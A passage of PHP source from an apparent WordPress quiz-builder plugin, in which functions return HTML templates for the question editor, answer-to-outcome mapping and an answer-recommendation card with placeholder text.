							<div class="question_add_more_ans_btn">Add New Answer</div>
							<div class="assessment_outcome_connect_btn  personality_outcome_connect_btn" >
                               <div class="outcome-options">
                                    <span class="outcome-option-connect" >Connect to Outcome </span>
                                    <span class="outcome-option-skip outcome-option-active" >Skip Mapping</span>
                                </div>
                            </div>
						</div>
					</div>
					<div class="assessment_outcome_connect_wrapper" style="display:none">
						<div class="assessment_outcome_head">
								<div class="AO_head_title">Map Answers to Outcome</div>
								
							</div>
							
						<div class="assessment_outcome_connect" >
						</div>
					</div> 
					
					
					<div class="QA-advance-option">
					<div class="quiz-content-card show_correct_inccorect_ans_checkbox_wrapper" style="display:none">
						<label for="" class="quiz_label">Do you want to display incorrect/correct answers?</label>
						<div class="quiz_right-content">
							<div class="square-switch_onoff">
								<input class="checkbox" name="show_correct_inccorect_ans_checkbox" type="checkbox" id="show_correct_inccorect_ans_checkbox_%%SQBRANDOMNO%%" value="Y"  >
								<label for="show_correct_inccorect_ans_checkbox_%%SQBRANDOMNO%%"></label>
							</div>
						</div>
					</div>
					
					
					<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
							<label for="" class="quiz_label">Correct answer message</label>
							<div class="quiz_right-content">
								<textarea class="sqb_correct_ans sqb_text_tiny_mce_editor_rename"></textarea>
							</div>
					</div>
					<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
							<label for="" class="quiz_label">Incorrect answer message</label>
							<div class="quiz_right-content">
								<textarea class="sqb_incorrect_ans sqb_text_tiny_mce_editor_rename"></textarea>
								
							</div>
					</div>
									
					
						
						
						
					</div>
					
					
					
					<div class="save_and_add_more_quesiton_btn_wrapper">
						<div class="save_question_btn" onclick="save_single_question()" >Save This Question</div>
						<div class="add_more_question_btn" onclick="sqb_add_more_question()">Add More Questions</div>
					</div>
				</div>
			</div>
				';
				
	return $html;
	
	
}

function sqbAddAnswerBotOptions(){
	
	$img_url = plugins_url('').'/smartquizbuilder/includes/images/reccomendation-image.jpg';
	
	$html = '<div class="ans_recommendation_result_temp answer_recommendation_outer_wrapper" >
				<div class="ans_recommendation_result_content">
					<div class="ans_recommendation_result_title sqb_tiny_mce_editor_rename "  ><div>What is Lorem Ipsum?</div></div>
					
				</div>
			<div class="ans_recommendation_result_progress">
				<div class="answer_recommendation_img_action">
					<span class="sqbHideAnsRecommendationTemplateImageOuter" ><button class="sqbHideAnsRecommendationTemplateImage">Hide Image</button></span>
					<span class="sqbShowAnsRecommendationTemplateImageOuter" style="display:none"><button class="sqbShowAnsRecommendationTemplateImage">Show Image</button></span>
					<span class="sqbDeleteAnsRecommendationTemplateImageOuter"><button class="sqbDeleteAnsRecommendationTemplateImage">Delete Image</button></span>
					<span class="sqbAddAnsRecommendationTemplateImageOuter" style="display:none"><button class="sqbAddAnsRecommendationTemplateImage" attr-img-src="'.$img_url.'">Add Image</button></span>
				
				</div>
			
			<div class="ans_recommendation_img_div ans_recommendation_result-media mb-3" id="%%CURRENTDATETIMEIMAAOUTER%%" >
				<img class="sqb_ans_dot_item_img %%CURRENTDATETIMEIMG%% sbq_change_img" src="'.$img_url.'">
				<span data-class="%%CURRENTDATETIMEIMG%%" class="ans_recommendation_img_upload sqb_change_img question_img_upload sbq_change_img"><i class="fa fa-camera" aria-hidden="true"></i></span>
			</div>
			<div class="answer_recommendation_description_action">
				<span class="sqbHideAnsRecommendationDescriptionOuter"><button class="sqbHideAnsRecommendationDescription">Hide Description</button></span>
				<span class="sqbShowAnsRecommendationDescriptionOuter" style="display:none"><button class="sqbShowAnsRecommendationDescription">Show Description</button></span>
			</div>
			<div class="sqb_tiny_mce_editor_rename ans_recommendation_description" ><div>It is a long established fact that a reader will be distracted by the</div> </div>
		</div>
	</div>
	';
                      
	return $html;
}


echo '<style>
body {
--template9_question_screen_play_btn_color: '.$question_video_play_btn_color.';
}
</style>';